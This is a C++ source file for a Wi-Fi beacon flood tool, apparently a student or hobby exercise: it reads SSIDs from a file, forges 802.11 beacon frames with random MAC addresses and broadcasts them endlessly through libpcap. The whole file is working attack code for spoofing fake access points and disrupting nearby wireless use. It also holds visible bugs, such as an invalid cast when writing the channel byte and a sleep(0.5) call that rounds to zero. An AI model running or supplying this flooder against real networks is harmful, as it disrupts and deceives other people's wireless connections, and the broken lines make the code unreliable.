#include <iostream>
#include <fstream>
#include <list>
#include <unistd.h>

#include "pcap.h"
#include "beaconframe.h"

using namespace std;

uint8_t channel_{36};

void beacon_flood(char* if_name, char* ssid_list) {
	list<BeaconFrame> bfl;
	char errbuf[PCAP_ERRBUF_SIZE];
		ifstream fp(ssid_list);
	if (fp.fail()) {
		cerr << "Cannot open ssid list" << endl;
		exit(-1);
	}

	string line;
	Mac mac;
	BeaconFrame beaconframe;

	while(getline(fp,line)){
		mac = Mac::randomMac();

		beaconframe.radioHdr_.len_ = 8;
		beaconframe.radioHdr_.pad_ = 0;
		beaconframe.radioHdr_.present_ = 0;
		beaconframe.radioHdr_.ver_ = 0;

		PBeaconHdr bh = &beaconframe.beaconHdr_;

		bh->ver_ = 0;
		bh->type_ = 0;
		bh->subtype_ = Dot11Hdr::Beacon;		
		bh->flags_ = 0;
		bh->duration_ = 0;

		// addr1, addr2, addr3
		bh->addr1_ = Mac::broadcastMac();
		bh->addr2_ = mac;
		bh->addr3_ = mac;
		bh->frag_ = 0;
		bh->seq_ = 0;

		bh->fix_.timestamp_ = 0;
		bh->fix_.beaconInterval_ = 0x6400;
		bh->fix_.capabilities_ = 0x0011;

		BeaconHdr::Tag* tag = bh->tag();
		string ssid = line;

		tag->num_ = BeaconHdr::TagSsidParameterSet;
		tag->len_ = ssid.length();
		
		if(ssid.length() > MAX_SSID_LEN){
			cerr << "[*] Given SSID is too long" << endl;
			exit(-1);
		}
		memcpy(tag->value(),ssid.c_str(), ssid.length());
		tag = tag->next();
		
		tag->num_ = BeaconHdr::TagSupportedRated;
		tag->len_ = 8;
		char* p = (char*)tag->value();
		*p++ = 0x82; // 1(B)
		*p++ = 0x84; // 2(B)
		*p++ = 0x8B; // 5.5(B)
		*p++ = 0x96; // 11(B)
		*p++ = 0x24; // 18
		*p++ = 0x30; // 24
		*p++ = 0x48; // 36
		*p++ = 0x6C; // 54
		tag = tag->next();

		tag->num_ = BeaconHdr::TagDsParameterSet;
		tag->len_ = 1;
		*(uint8_t)(tag->value()) = channel_;
		tag = tag->next();

		beaconframe.size_ = (char*)tag - (char*)&beaconframe;

		bfl.push_back(beaconframe);
	}	

	pcap_t* handle = pcap_open_live(if_name, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		cerr << "couldn't open device " << if_name << ": "<< errbuf << endl;
		exit(-1);
	}

	while(true){
		for (BeaconFrame& bf: bfl) {	
			int res = pcap_sendpacket(handle, (const u_char*)&bf, bf.size_);
			if (res != 0) {
            	cerr << "pcap_sendpacket returned" << res << "error=" << pcap_geterr(handle) << endl;
        	}
        	sleep(0.5);
		}
	}
}